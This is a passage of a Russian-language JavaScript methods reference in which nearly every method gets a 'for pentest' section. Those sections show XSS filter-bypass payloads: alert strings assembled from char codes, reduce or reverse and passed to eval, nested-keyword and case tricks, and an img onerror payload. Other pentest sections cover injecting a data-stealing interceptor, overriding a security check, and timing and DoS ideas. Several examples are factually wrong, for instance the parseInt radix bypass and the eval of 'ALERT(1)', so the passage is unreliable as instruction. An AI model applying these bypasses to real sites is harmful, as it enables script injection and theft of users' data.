// 2. Проверка на freeze для обхода
if (!Object.isFrozen(config)) {
    config.debug = true; // включаем дебаг
}

// 3. Обход через Object.defineProperty (не работает с frozen)
```

// isFrozen, isSealed, isExtensible

```javaScript
const obj = { x: 1 };

console.log(Object.isExtensible(obj)); // true
Object.preventExtensions(obj);
console.log(Object.isExtensible(obj)); // false

Object.seal(obj);
console.log(Object.isSealed(obj)); // true
console.log(Object.isFrozen(obj)); // false (если свойства writable)

Object.freeze(obj);
console.log(Object.isFrozen(obj)); // true

// ДЛЯ ПЕНТЕСТА:
// 1. Разведка состояния объекта
if (!Object.isFrozen(securityModule)) {
    // можно модифицировать!
    securityModule.check = function() { return true; };
}

// 2. Обход через проверки
function safe(obj) {
    if (Object.isSealed(obj)) {
        return obj; // считаем безопасным
    }
    return process(obj);
}
// Но sealed не значит безопасный!
```



### 3.2 String - ДЛЯ ОБХОДА ФИЛЬТРОВ



// charAt, charCodeAt, fromCharCode

```javaScript
const str = 'XSS';

str.charAt(0);     // 'X'
str.charCodeAt(0); // 88 (код символа)
String.fromCharCode(88, 83, 83); // 'XSS'

// ДЛЯ ПЕНТЕСТА: ОБХОД ФИЛЬТРОВ
// 1. Сборка строки из кодов
String.fromCharCode(97, 108, 101, 114, 116, 40, 41); // 'alert()'

// 2. Обход через charCodeAt + fromCharCode
const payload = [97,108,101,114,116,40,41].map(x => 
    String.fromCharCode(x)).join(''); // 'alert()'

// 3. Динамическое создание
const func = 'aler' + String.fromCharCode(116); // 'alert'
window[func](1); // alert(1)
```

// concat, slice, substring, substr

```javaScript
const str = 'Hello XSS';

str.concat('!');         // 'Hello XSS!'
str.slice(0,5);          // 'Hello'
str.slice(-3);           // 'XSS'
str.substring(6,9);      // 'XSS'
str.substr(6,3);         // 'XSS' (устарел)

// ДЛЯ ПЕНТЕСТА: ОБХОД ФИЛЬТРОВ
// 1. Разбивка ключевых слов
const a = 'aler'.concat('t'); // 'alert'
window[a](1);

// 2. Извлечение частей
const keyword = '<script>alert(1)</script>';
const tag = keyword.slice(1,7); // 'script'

// 3. Обход через отрицательные индексы
const payload = 'XSSalert()'.slice(3); // 'alert()'
```

// indexOf, lastIndexOf, includes

```javaScript
const str = 'alert(1)';

str.indexOf('alert');    // 0
str.indexOf('xss');      // -1
str.lastIndexOf('(');    // 5
str.includes('alert');   // true
str.includes('xss');     // false

// ДЛЯ ПЕНТЕСТА: ОБХОД ПРОВЕРОК
// 1. Обход через смену регистра
function filter(str) {
    if (str.includes('<script>')) {
        return 'blocked';
    }
    return str;
}
filter('<SCRIPT>alert(1)</SCRIPT>'); // пройдет!

// 2. Обход через кодирование
const payload = '<scr' + 'ipt>';
if (!payload.includes('<script>')) { // false
    eval(payload); // XSS!
}

// 3. Использование нулевого символа
const bypass = '<script>\0alert(1)</script>';
bypass.includes('<script>'); // true, но фильтр может споткнуться на \0
```

// startsWith, endsWith

```javaScript
const str = 'https://evil.com/xss.js';

str.startsWith('https://'); // true
str.endsWith('.js');         // true

// ДЛЯ ПЕНТЕСТА:
// 1. Обход проверок протокола
function isSafe(url) {
    return url.startsWith('https://');
}
isSafe('https://evil.com'); // true, хотя evil

// 2. Обход через смену регистра
'JAVASCRIPT:alert(1)'.startsWith('javascript:'); // false!
```

// replace, replaceAll (regexp)

```javaScript
const str = 'xss xss xss';

str.replace('xss', 'safe');       // 'safe xss xss' (первое)
str.replace(/xss/g, 'safe');      // 'safe safe safe' (все)
str.replaceAll('xss', 'safe');    // 'safe safe safe'

// С функцией замены
str.replace(/xss/g, (match, offset) => {
    return `found at ${offset}`;
});

// ДЛЯ ПЕНТЕСТА: ЭТО ЗОЛОТО!
// 1. Обход через replace с функцией
function sanitize(str) {
    return str.replace(/[<>]/g, (match) => {
        return match === '<' ? '&lt;' : '&gt;';
    });
}
// Если передать объект с replace, можно обойти
const evil = {
    toString: () => '<script>alert(1)</script>',
    replace: function() { return this.toString(); }
};
sanitize(evil); // не сработает replace!

// 2. Замена на спецсимволы
'<script>'.replace(/</g, '\\u003c'); // '\u003cscript>'

// 3. Использование $ в replace
'hello'.replace('hello', '$`'); // '' (вся строка до совпадения)

// 4. Обход через replace на себя
function filter(str) {
    return str.replace(/alert/g, '');
}
filter('alalertert'); // 'alert' (удалили внутренний alert, остался!)
```

// toUpperCase, toLowerCase

```javaScript
const str = 'Alert(1)';

str.toLowerCase(); // 'alert(1)'
str.toUpperCase(); // 'ALERT(1)'

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров по ключевым словам
function filter(str) {
    if (str.includes('alert')) {
        return 'blocked';
    }
    return str;
}
filter('ALERT(1)'); // пройдет!
eval('ALERT(1)'); // но eval не зависит от регистра? alert работает!

// 2. Турецкая проблема (I vs i)
'SCRIPT'.toLowerCase(); // 'script' (но в турецком I без точки)
// Может вызвать баги в фильтрах
```

// trim, trimStart, trimEnd

```javaScript
const str = '  <script>alert(1)</script>  ';

str.trim();       // '<script>alert(1)</script>'
str.trimStart();  // '<script>alert(1)</script>  '
str.trimEnd();    // '  <script>alert(1)</script>'

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров через пробелы
function filter(str) {
    return str.replace(/<script>/g, '');
}
filter('  <script>alert(1)</script>'); // '  alert(1)</script>'
// Пробелы мешают точному совпадению

// 2. Невидимые символы
const payload = '\u200B<script>alert(1)</script>'; // zero-width space
payload.trim(); // не удаляет спецсимволы!
```

// split, join

```javaScript
const str = 'a,l,e,r,t';
str.split(','); // ['a','l','e','r','t']
['a','l','e','r','t'].join(''); // 'alert'

// ДЛЯ ПЕНТЕСТА: ЭТО КЛАССИКА!
// 1. Сборка строки из массива
const payload = ['a','l','e','r','t','(','1',')'].join('');
eval(payload); // XSS!

// 2. Разбивка для обхода
const parts = '<script>alert(1)</script>'.split('');
// можно передать как массив, фильтр не сработает

// 3. join с разделителем для обхода
['<script>', 'alert(1)', '</script>'].join(''); // все равно склеится

// 4. Обход через split с лимитом
'alert(1)'.split('', 3); // ['a','l','e']
```

// match, matchAll, search

```javaScript
const str = 'xss: alert(1) and alert(2)';

str.match(/alert\(\d+\)/);      // ['alert(1)']
str.match(/alert\(\d+\)/g);     // ['alert(1)', 'alert(2)']
[...str.matchAll(/alert\((\d+)\)/g)]; // с группами
str.search(/alert/);             // 5 (индекс)

// ДЛЯ ПЕНТЕСТА:
// 1. Извлечение данных
const matches = str.match(/token=([^&]+)/);
if (matches) {
    sendToEvil(matches[1]); // кража токена
}

// 2. Проверка на уязвимости
if (str.match(/<script>/i)) {
    console.log('XSS detected');
}
// Но можно обойти через вложенные теги
```

// padStart, padEnd

```javaScript
'alert'.padStart(10, 'x'); // 'xxxxxalert'
'alert'.padEnd(10, 'x');   // 'alertxxxxx'

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытие в мусоре
const payload = '1'.padStart(100, 'a') + 'alert(1)';
// длинная строка может обойти фильтры по длине

// 2. Создание уникальных строк
const id = 'xss'.padStart(20, Math.random().toString(36));
```

// повторы
```javaScript
'xss'.repeat(3); // 'xssxssxss'

// ДЛЯ ПЕНТЕСТА:
// 1. DoS через огромную строку
const big = 'a'.repeat(1e8); // 100 миллионов символов

// 2. Обход фильтров
const payload = '<script>'.repeat(1) + 'alert(1)' + '</script>'.repeat(1);
```

// raw (шаблонные строки)

```javaScript
// String.raw - сырые строки без экранирования
const path = String.raw`C:\Users\name`; // слеши сохраняются
const str = String.raw`alert(1)\n\u0041`; // \n не интерпретируется как перевод

// ДЛЯ ПЕНТЕСТА:
// 1. Обход экранирования
const payload = String.raw`<script>alert(1)<\/script>`; // \ не экранирует /

// 2. Сохранение обратных слешей для обхода
const bypass = String.raw`\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029`;
eval(bypass); // \u0061 интерпретируется как 'a' после eval!
```




### 3.3 Array - ПРОДВИНУТО



// length (можно менять!)

```javaScript
const arr = [1, 2, 3, 4, 5];

console.log(arr.length); // 5

// Укорачиваем массив
arr.length = 3;
console.log(arr); // [1, 2, 3] - элементы 4,5 удалены!

// Удлиняем массив (появляются пустые элементы)
arr.length = 10;
console.log(arr); // [1, 2, 3, empty × 7]
console.log(arr[5]); // undefined (но это empty, не реальный undefined)

// Можно сделать пустым
arr.length = 0;
console.log(arr); // []

// ДЛЯ ПЕНТЕСТА:
// 1. Быстрая очистка данных
const sensitiveData = ['token123', 'session456'];
sensitiveData.length = 0; // данные исчезли (если нет других ссылок)

// 2. Создание разреженных массивов для обхода
const sparse = [1, 2, 3];
sparse.length = 100;
sparse.forEach(x => console.log(x)); // только 1,2,3 (пустые пропускаются!)
// map/filter тоже пропускают пустые

// 3. DoS через огромный length
const huge = [1];
huge.length = 1e9; // выделит память под массив такой длины? может упасть

```

// flat, flatMap

```javaScript
// flat - разглаживает вложенные массивы
const nested = [1, [2, [3, [4]]]];
nested.flat();        // [1, 2, [3, [4]]] (по умолчанию глубина 1)
nested.flat(2);       // [1, 2, 3, [4]]
nested.flat(Infinity); // [1, 2, 3, 4] (все уровни)

// flatMap - map + flat глубиной 1
const arr = ['hello world', 'xss payload'];
arr.flatMap(str => str.split(' ')); // ['hello', 'world', 'xss', 'payload']

// ДЛЯ ПЕНТЕСТА:
// 1. Нормализация ввода
const userInput = [['<script>'], ['alert(1)'], ['</script>']];
const payload = userInput.flat(Infinity).join(''); // '<script>alert(1)</script>'

// 2. flatMap для обхода фильтров
const words = ['<script>', 'alert(1)'];
const filtered = words.flatMap(w => w.includes('<') ? [] : [w]); // удаляет опасные
// но можно обойти через вложенность: [['<script>']].flatMap() - сработает?

// 3. flat с удалением пустых
[1, , 3].flat(); // [1, 3] - пустые удаляются!
```

// reverse (мутирует!)

```javaScript
const arr = [1, 2, 3, 4, 5];
const reversed = arr.reverse();

console.log(reversed); // [5, 4, 3, 2, 1]
console.log(arr);      // [5, 4, 3, 2, 1] - оригинал тоже изменился!

// ДЛЯ ПЕНТЕСТА:
// 1. Обфускация через reverse
const payload = ['t','p','i','r','c','s','>','<'].reverse().join('');
// '<script>'

// 2. Неожиданная мутация
function processArray(arr) {
    const copy = arr.reverse(); // ОЙ! мутировали исходный!
    return copy;
}
const original = [1,2,3];
processArray(original);
console.log(original); // [3,2,1] - исходный испорчен!

// 3. Reverse для обхода фильтров по порядку
const attack = ['>', 'tpircs', '<'].reverse(); // ['<', 'script', '>']
```

// sort (кастомный компаратор)

```javaScript
const arr = [3, 1, 4, 2, 5];
arr.sort(); // [1, 2, 3, 4, 5] (как строки по умолчанию!)

// Проблема: сортировка как строки
const nums = [10, 2, 30];
nums.sort(); // [10, 2, 30] - потому что "10" < "2" как строки!

// Правильная сортировка чисел
nums.sort((a, b) => a - b); // [2, 10, 30]

// Кастомная сортировка
const items = [
    { name: 'XSS', level: 3 },
    { name: 'SQLi', level: 1 },
    { name: 'CSRF', level: 2 }
];
items.sort((a, b) => a.level - b.level);

// ДЛЯ ПЕНТЕСТА:
// 1. Внедрение кода в компаратор
arr.sort((a, b) => {
    alert(1); // XSS в процессе сортировки!
    return a - b;
});

// 2. Нестабильная сортировка для обхода
const payloads = [
    { cmd: 'alert(1)', priority: 1 },
    { cmd: 'prompt(1)', priority: 1 }
];
payloads.sort((a, b) => a.priority - b.priority); // порядок не гарантирован!

// 3. Изменение состояния в компараторе
let counter = 0;
arr.sort((a, b) => {
    if (counter++ === 0) {
        arr.push('xss'); // мутация во время сортировки - опасно!
    }
    return a - b;
});
```

// splice (удаление/вставка)

```javaScript
const arr = ['a', 'b', 'c', 'd', 'e'];

// Удаление: splice(индекс, кол-во)
const removed = arr.splice(1, 2); // удаляем 2 элемента с индекса 1
console.log(removed); // ['b', 'c']
console.log(arr);     // ['a', 'd', 'e']

// Вставка: splice(индекс, 0, ...элементы)
arr.splice(2, 0, 'x', 'y'); // вставляем 'x','y' на индекс 2
console.log(arr); // ['a', 'd', 'x', 'y', 'e']

// Замена: splice(индекс, кол-во, ...новые)
arr.splice(1, 2, 'm', 'n'); // удаляем 2 с индекса 1 и вставляем 'm','n'

// Отрицательные индексы - с конца
arr.splice(-2, 1); // удаляем второй с конца

// ДЛЯ ПЕНТЕСТА:
// 1. Удаление защитных элементов
const filters = [filterXSS, filterSQL, filterCSRF];
filters.splice(0, 1); // удалили XSS-фильтр!

// 2. Добавление своего кода в цепочку
const handlers = [validate, log, save];
handlers.splice(1, 0, (data) => {
    sendToEvil(data); // внедрили перехватчик
});

// 3. Очистка массива через splice
const data = ['secret1', 'secret2'];
data.splice(0, data.length); // очистили
```

// fill

```javaScript
// fill - заполняет массив значением
const arr = [1, 2, 3, 4, 5];
arr.fill(0); // [0, 0, 0, 0, 0]

// С индексами
arr.fill('x', 1, 3); // [0, 'x', 'x', 0, 0]

// Создание массива с заполнением
Array(5).fill('xss'); // ['xss', 'xss', 'xss', 'xss', 'xss']

// ДЛЯ ПЕНТЕСТА:
// 1. Быстрая инициализация вредоноса
const payloads = Array(100).fill('<img src=x onerror=alert(1)>');

// 2. Заполнение для обхода
const buffer = new Array(1000);
buffer.fill('a'); // подготовка буфера под атаку

// 3. Затирание данных
const tokens = ['token1', 'token2', 'token3'];
tokens.fill('deleted'); // затерли все токены
```

// copyWithin

```javaScript
// copyWithin - копирует часть массива внутри себя (не меняя длину)
const arr = ['a', 'b', 'c', 'd', 'e'];

// copyWithin(куда, откуда, докуда)
arr.copyWithin(0, 3, 5); // копируем индексы 3-4 в начало
console.log(arr); // ['d', 'e', 'c', 'd', 'e']

// Можно без конца (до конца)
arr.copyWithin(2, 0, 2); // ['d', 'e', 'd', 'e', 'e']

// Отрицательные индексы
arr.copyWithin(-2, -4, -2);

// ДЛЯ ПЕНТЕСТА:
// 1. Размножение данных
const payload = ['<', 's', 'c', 'r', 'i', 'p', 't', '>'];
payload.copyWithin(0, 3, 8); // дублируем часть

// 2. Обход через копирование
const filter = ['<script>', 'alert(1)'];
// можно скопировать части для сборки payload
```

// Array.isArray

```javaScript
Array.isArray([]);        // true
Array.isArray({});        // false
Array.isArray('[]');      // false
Array.isArray(new Array()); // true

// instanceof тоже работает, но с iframe проблема
[] instanceof Array; // true

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через проверку
function process(input) {
    if (Array.isArray(input)) {
        return input.map(x => escape(x));
    }
    return escape(input); // строки экранируем по-другому
}
// Можно передать массив, чтобы попасть в map

// 2. Проблема с разными фреймами
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
const arr = new iframe.contentWindow.Array(1,2,3);
console.log(arr instanceof Array); // false (разные глобальные объекты)
console.log(Array.isArray(arr));   // true (работает кросс-фреймно)
```

// Array.of, Array.from

```javaScript
// Array.of - создает массив из аргументов
Array.of(1, 2, 3);     // [1, 2, 3]
Array.of(3);           // [3] (в отличие от new Array(3) - пустой массив длины 3)

// Array.from - из итерируемого или псевдомассива
Array.from('XSS');     // ['X', 'S', 'S']
Array.from(new Set([1,2,2])); // [1,2]

// С map-функцией
Array.from([1,2,3], x => x * 2); // [2,4,6]

// Псевдомассивы (length и индексы)
const fakeArray = { 0: 'a', 1: 'b', length: 2 };
Array.from(fakeArray); // ['a', 'b']

// ДЛЯ ПЕНТЕСТА:
// 1. Array.from на arguments
function test() {
    const args = Array.from(arguments);
    args.push('xss');
    return args;
}

// 2. Array.from на DOM коллекциях (живых!)
const divs = document.querySelectorAll('div');
Array.from(divs).forEach(div => {
    div.innerHTML = 'hacked'; // меняем все div
});

// 3. Array.from с функцией map для обфускации
Array.from('alert', (c, i) => 
    String.fromCharCode(c.charCodeAt(0) + i)
).join(''); // хер знает что получится

// 4. Преобразование псевдомассива с геттерами
const evil = {
    0: 'a',
    get 1() { alert(1); return 'b'; },
    length: 2
};
Array.from(evil); // XSS при доступе к элементу 1!
```

// keys, values, entries

```javaScript
const arr = ['x', 's', 's'];

// Итераторы
const keys = arr.keys();   // итератор индексов: 0,1,2
const values = arr.values(); // итератор значений: 'x','s','s'
const entries = arr.entries(); // итератор пар: [0,'x'], [1,'s'], [2,'s']

// Превращение в массивы
Array.from(arr.keys());   // [0, 1, 2]
Array.from(arr.entries()); // [[0,'x'], [1,'s'], [2,'s']]

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через итераторы
for (const [index, value] of arr.entries()) {
    console.log(index, value);
    if (value === 's') {
        arr[index] = 'XSS'; // меняем на лету
    }
}

// 2. keys() возвращает индексы, даже для разреженных
const sparse = [1, , 3];
Array.from(sparse.keys()); // [0, 1, 2] (1 есть, хоть и пусто)
```

// reduce, reduceRight

```javaScript
// reduce - сворачивает массив слева направо
const sum = [1, 2, 3, 4].reduce((acc, val) => acc + val, 0); // 10

// reduceRight - справа налево
const concatRight = ['a', 'b', 'c'].reduceRight((acc, val) => acc + val, ''); // 'cba'

// Более сложный пример
const objects = [{ x: 1 }, { x: 2 }, { x: 3 }];
const merged = objects.reduce((acc, obj) => ({ ...acc, ...obj }), {});

// ДЛЯ ПЕНТЕСТА: ЭТО ЗОЛОТАЯ ЖИЛА!
// 1. Сборка строки из частей
const chars = ['a', 'l', 'e', 'r', 't', '(', '1', ')'];
const payload = chars.reduce((acc, c) => acc + c, '');
eval(payload); // XSS!

// 2. reduce для обфускации
const build = [97, 108, 101, 114, 116, 40, 49, 41].reduce(
    (acc, code) => acc + String.fromCharCode(code), ''
); // 'alert(1)'

// 3. Аккумулятор как объект для сложной сборки
const attack = ['<', 'script', '>'].reduce((acc, val) => {
    if (val === 'script') {
        acc.push('img src=x onerror=alert(1)'); // подмена
    } else {
        acc.push(val);
    }
    return acc;
}, []).join(''); // '<img src=x onerror=alert(1)>'

// 4. reduceRight для reverse обхода
const reversed = ['>', 'tpircs', '<'].reduceRight((acc, val) => acc + val, '');
// '<script>'

// 5. Внедрение кода в reduce
[1, 2, 3].reduce((acc, val) => {
    if (val === 2) {
        alert(1); // XSS в процессе!
    }
    return acc + val;
}, 0);

// 6. Обход через отсутствие начального значения
// Если нет начального, первым acc становится первый элемент
const arr = [];
const result = arr.reduce((acc, val) => acc + val); // TypeError! пустой массив
// Можно вызвать ошибку для утечки информации
```


### 3.4 Number и Math



// Number методы: isNaN, isFinite, isInteger, isSafeInteger

```javaScript
// isNaN - проверяет, является ли значение NaN (с приведением!)
isNaN(NaN);           // true
isNaN('XSS');         // true! (строка приводится к числу -> NaN)
isNaN(undefined);     // true
isNaN(null);          // false (null -> 0)
isNaN('123');         // false (строка приводится к 123)

// Number.isNaN - без приведения (строгая проверка)
Number.isNaN(NaN);           // true
Number.isNaN('XSS');         // false (это строка, не NaN)
Number.isNaN(undefined);     // false

// isFinite - конечно ли число
isFinite(42);          // true
isFinite(Infinity);    // false
isFinite('42');        // true (приводит к числу)
isFinite('XSS');       // false (приводится к NaN)

// Number.isFinite - строго
Number.isFinite('42'); // false

// isInteger - целое ли
Number.isInteger(42);      // true
Number.isInteger(42.5);    // false
Number.isInteger('42');    // false (строка)

// isSafeInteger - в безопасном диапазоне (±2^53-1)
Number.isSafeInteger(42);                 // true
Number.isSafeInteger(9007199254740991);   // true
Number.isSafeInteger(9007199254740992);   // false

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через isNaN
function filterInput(input) {
    if (isNaN(input)) {
        return 'default'; // NaN считаем невалидным
    }
    return input * 2; // число
}
filterInput('<script>'); // 'default' - обошли? нет, но можно вызвать поведение

// 2. Разница isNaN и Number.isNaN
if (!isNaN(userInput)) { // если прошло, значит число
    eval(userInput); // ОПАСНО! isNaN('alert(1)') = true, значит не число, но eval выполнит!
}

// 3. Обход проверок через BigInt
Number.isSafeInteger(9007199254740992n); // false, но bigint может быть опасен
```

// parseInt, parseFloat (radix!)

```javaScript
// parseInt - парсит целое число
parseInt('42');           // 42
parseInt('42px');         // 42 (обрезает нечисловое)
parseInt('  42  ');       // 42
parseInt('3.14');         // 3 (только целая часть)

// radix - система счисления (ВАЖНО!)
parseInt('1010', 2);      // 10 (двоичная)
parseInt('FF', 16);       // 255
parseInt('077', 8);       // 63 (восьмеричная, если строго)
parseInt('077');          // 77 (в ES5+ без radix - десятичная)

// Всегда указывай radix! Иначе может быть сюрприз
parseInt('010');          // 10 (в некоторых средах 8!)
parseInt('0x10');         // 16 (определяет по префиксу)

// parseFloat - парсит число с плавающей точкой
parseFloat('3.14');       // 3.14
parseFloat('3.14abc');    // 3.14
parseFloat('3.14.15');    // 3.14

// ДЛЯ ПЕНТЕСТА: ЭТО ВАЖНО!
// 1. Обход через radix
function filterAge(age) {
    const num = parseInt(age, 10);
    if (num < 18) return 'too young';
    return 'ok';
}
filterAge('0x1F'); // 31 (шестнадцатеричная) - обход проверки на <18!

// 2. Обход через пробелы и символы
parseInt('  42  ', 10); // 42 - нормально
parseInt('42\n', 10);   // 42
parseInt('42%', 10);    // 42
parseInt('$42', 10);    // NaN - символ в начале

// 3. Использование для обфускации
const payload = String.fromCharCode(
    parseInt('101', 2),   // 5
    parseInt('108', 2),   // 108 (l)
    parseInt('101', 2),   // 101 (e)
    parseInt('114', 2),   // 114 (r)
    parseInt('116', 2)    // 116 (t)
); // 'alert'? нет, получится что-то другое

// 4. parseFloat для обхода целочисленных проверок
function isAdmin(id) {
    return id === 123; // строгое сравнение
}
isAdmin('123.0'); // false (строка vs число)
isAdmin(parseFloat('123.0')); // 123 - true! обошли?
```

// toFixed, toPrecision, toExponential

```javaScript
const num = 123.456789;

// toFixed - фиксированное кол-во знаков после запятой
num.toFixed(2);      // '123.46' (округляет!)
num.toFixed(0);      // '123'

// toPrecision - всего знаков (целая + дробная)
num.toPrecision(4);  // '123.5'
num.toPrecision(2);  // '1.2e+2' (экспоненциальная форма)

// toExponential - экспоненциальная форма
num.toExponential(2); // '1.23e+2'

// ДЛЯ ПЕНТЕСТА:
// 1. Превращение чисел в строки для обхода
const evil = 123;
evil.toFixed(0); // '123' - строка, может пройти фильтры

// 2. Создание необычных чисел для обхода
(0.1 + 0.2).toFixed(2); // '0.30' - округление может скрыть погрешность

// 3. toPrecision для экспоненциальной записи
(1000000).toPrecision(1); // '1e+6' - может обойти фильтры чисел
```

// Math: min, max, round, floor, ceil, trunc

```javaScript
// min/max - минимум/максимум
Math.min(5, 2, 8, 1);    // 1
Math.max(5, 2, 8, 1);    // 8
Math.max.apply(null, [1,2,3]); // 3

// round - округление до ближайшего целого
Math.round(3.4);  // 3
Math.round(3.5);  // 4
Math.round(-3.5); // -3 (особенность!)

// floor - округление вниз
Math.floor(3.9);  // 3
Math.floor(-3.1); // -4

// ceil - округление вверх
Math.ceil(3.1);   // 4
Math.ceil(-3.9);  // -3

// trunc - обрезает дробную часть (без округления)
Math.trunc(3.9);   // 3
Math.trunc(-3.9);  // -3 (отличие от floor)

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через округление
function checkAmount(amount) {
    if (amount < 100) return 'denied';
    return 'approved';
}
checkAmount(99.9); // 'denied'
checkAmount(Math.ceil(99.1)); // 100 - 'approved'! обход

// 2. min/max для ограничений
const userAge = '25';
Math.min(18, userAge); // 18? нет, Math.min приводит к числу: 18 vs 25 -> 18

// 3. Создание индексов для массивов
const arr = ['a', 'b', 'c', 'd'];
const index = Math.min(5, arr.length - 1); // 3
arr[index]; // 'd' - безопасный доступ

// 4. Особенности round с отрицательными
Math.round(-3.5); // -3 (идет к ближайшему целому)
Math.floor(-3.5); // -4 (всегда вниз)
```

// random (НЕ для безопасности!)

```javaScript
// random - псевдослучайное число [0, 1)
Math.random(); // 0.123456789

// Случайное целое от min до max
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ДЛЯ ПЕНТЕСТА: НИКОГДА НЕ ИСПОЛЬЗОВАТЬ ДЛЯ БЕЗОПАСНОСТИ!
// 1. Предсказуемость (не криптостойкий)
// Можно восстановить состояние генератора

// 2. Обход через random для создания уникальных ID
const token = Math.random().toString(36).substring(2); // 'x8j3k9l2' - НЕ безопасный токен!

// 3. Для обфускации имен
const funcName = 'x' + Math.random().toString(36).substring(7);
window[funcName] = () => alert(1);
window[funcName](); // вызов через случайное имя

// 4. DoS через random? нереально
```

// pow, sqrt, abs, sign

```javaScript
// pow - степень
Math.pow(2, 3);   // 8
2 ** 3;           // 8 (то же самое)

// sqrt - квадратный корень
Math.sqrt(16);    // 4

// abs - абсолютное значение
Math.abs(-5);     // 5
Math.abs(5);      // 5

// sign - знак числа
Math.sign(10);    // 1
Math.sign(-5);    // -1
Math.sign(0);     // 0
Math.sign(-0);    // -0
Math.sign(NaN);   // NaN

// ДЛЯ ПЕНТЕСТА:
// 1. pow для создания больших чисел
Math.pow(2, 53); // 9007199254740992 - небезопасное целое

// 2. abs для обхода проверок на отрицательные
function checkAmount(amount) {
    if (amount < 0) return 0; // защита от отрицательных
    return amount;
}
checkAmount(Math.abs(-100)); // 100 - обошли? нет, просто взяли модуль

// 3. sign для определения направления
const direction = Math.sign(userInput); // -1, 0, 1
```


### 3.5 Date



// Создание дат

```javaScript
// Разные способы создания
new Date();                    // текущая дата
new Date(2024, 0, 1, 12, 30, 0); // 1 января 2024, 12:30 (месяцы с 0!)
new Date('2024-01-01T12:30:00'); // из строки ISO
new Date(1704112200000);       // из таймстампа (мс)
Date.now();                    // текущий таймстамп (статический метод)

// ВАЖНО: месяцы от 0 до 11!
new Date(2024, 0, 1);  // 1 января 2024
new Date(2024, 11, 1); // 1 декабря 2024

// ДЛЯ ПЕНТЕСТА:
// 1. Невалидные даты
new Date('not a date'); // Invalid Date
isNaN(new Date('not a date')); // true (можно проверить)

// 2. Обход через Date в XSS
const payload = 'alert(1)';
new Date(payload); // не выполнится, но можно использовать для ошибок
```

// get/set методы (UTC/local)

```javaScript
const d = new Date(2024, 0, 1, 15, 30, 45);

// Локальное время (зависит от часового пояса)
d.getFullYear();     // 2024
d.getMonth();        // 0 (январь)
d.getDate();         // 1
d.getDay();          // 1 (понедельник: 0 вс, 1 пн...)
d.getHours();        // 15
d.getMinutes();      // 30
d.getSeconds();      // 45
d.getMilliseconds(); // 0

// UTC время
d.getUTCFullYear();  // 2024
d.getUTCHours();     // разница с локальным

// set методы
d.setFullYear(2025);
d.setMonth(5);       // июнь
d.setDate(15);
d.setHours(10);

// ДЛЯ ПЕНТЕСТА:
// 1. Таймстампы для уникальных ID
const id = Date.now(); // 1704112200000
// можно предсказать примерно

// 2. Разница между get и getUTC для fingerprint
const offset = d.getTimezoneOffset(); // разница в минутах
// можно определить регион пользователя
```

// parse

```javaScript
// Date.parse - парсит строку в таймстамп
Date.parse('2024-01-01T12:30:00'); // 1704112200000
Date.parse('January 1, 2024');     // 1704067200000 (зависит от реализации)
Date.parse('2024/01/01');          // тоже работает

// Невалидные
Date.parse('xss'); // NaN

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через формат даты
function filterInput(input) {
    if (input.includes('<script>')) {
        return 'blocked';
    }
    return input;
}
const attack = Date.parse('Jan 1 <script>'); // NaN? нет, будет ошибка парсинга
// может сломать логику

// 2. Разные форматы в разных браузерах
Date.parse('01/02/2024'); // США: 2 января, Европа: 1 февраля
// Можно для fingerprint
```

// toISOString

```javaScript
const d = new Date(2024, 0, 1, 15, 30, 0);
d.toISOString(); // '2024-01-01T12:30:00.000Z' (всегда UTC)

// Другие форматы
d.toString();      // 'Mon Jan 01 2024 15:30:00 GMT+0300'
d.toDateString();  // 'Mon Jan 01 2024'
d.toTimeString();  // '15:30:00 GMT+0300'
d.toLocaleString(); // локальный формат

// ДЛЯ ПЕНТЕСТА:
// 1. Генерация строк для обхода
const timestamp = new Date().toISOString().replace(/[-:]/g, ''); // '20240101123000'
// можно использовать как ID

// 2. Утечка информации о часовом поясе
new Date().toString().match(/GMT[+-]\d+/); // 'GMT+0300'
```

// timestamps

```javaScript
// Таймстамп - миллисекунды с 1 января 1970 UTC
Date.now();                // сейчас
new Date().getTime();      // то же самое
+new Date();               // унарный плюс тоже дает таймстамп

// Из таймстампа в дату
new Date(1704112200000);

// Разница между датами
const start = Date.now();
// ... что-то делаем ...
const end = Date.now();
console.log(end - start); // сколько миллисекунд прошло

// ДЛЯ ПЕНТЕСТА:
// 1. Измерение времени для side-channel атак
const start = performance.now();
// sensitive operation
const end = performance.now();
if (end - start > 100) {
    // вероятно, условие выполнилось (тайминг-атака)
}

// 2. Генерация "уникальных" чисел
const token = Date.now() + Math.random(); // НЕ безопасно!
```


### 3.6 RegExp - ВАЖНО



// Создание: literal vs new RegExp

```javaScript
// Литерал - /pattern/flags
const re1 = /alert/i;      // ищет alert независимо от регистра
const re2 = /<script>/g;   // глобальный поиск <script>

// Конструктор - new RegExp(pattern, flags)
const pattern = 'alert';
const re3 = new RegExp(pattern, 'i'); // динамическое создание

// Разница: в конструкторе нужно экранировать \
const re4 = new RegExp('\\d+'); // цифры (нужен двойной слеш)
const re5 = /\d+/;              // проще

// ДЛЯ ПЕНТЕСТА:
// 1. Инъекция в RegExp через конструктор
const userInput = '.*';
const re = new RegExp(userInput); // пользователь контролирует regexp!
// может быть ReDoS атака

// 2. Обход через экранирование
const filter = new RegExp('<script>', 'i');
filter.test('<SCRIPT>'); // true, но можно обойти
```

// Флаги: g, i, m, s, u, y

```javaScript
// i - case insensitive
/alert/i.test('ALERT'); // true

// g - global (все совпадения, не только первое)
'x x x'.match(/x/g); // ['x', 'x', 'x']

// m - multiline (^ и $ работают по строкам)
/^alert/m.test('first\nalert'); // true

// s - dotall (точка включает \n)
/alert.*xss/s.test('alert\ntest\nxss'); // true

// u - unicode (правильная обработка юникода)
/\u{61}/u.test('a'); // true

// y - sticky (поиск с lastIndex)
const re = /x/y;
re.lastIndex = 1;
'x x'.match(re); // null (ищет точно с позиции 1)

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через флаги
function filterXSS(str) {
    return str.replace(/<script>/gi, ''); // i - обходим регистр
}
// но <Script> все равно удалится

// 2. Обход multiline для ^ и $
